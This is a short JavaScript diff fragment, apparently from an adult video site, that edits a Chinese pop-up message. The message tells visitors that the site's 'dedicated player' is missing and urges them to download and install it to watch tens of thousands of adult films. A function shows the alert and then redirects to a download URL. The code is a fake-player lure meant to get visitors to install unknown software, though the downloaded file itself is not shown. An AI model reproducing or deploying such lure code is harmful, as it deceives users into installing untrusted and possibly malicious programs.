@@ -34,7 +34,7 @@ try{
 
 }
 
-var tixing="系统没有检测到本站专用色片播放器,请下载本站专用（"+appname2+"）播放器，安装后运行专用浏览即可观看本站3W部成人爽片！";
+var tixing="系统没有检测到本站专用色片播放器,请下载本站专用（"+appname+"）播放器，安装后运行专用浏览即可观看本站3W部成人爽片！";
 function ts(){
 	alert(tixing);window.location.href=appurl2;
 }
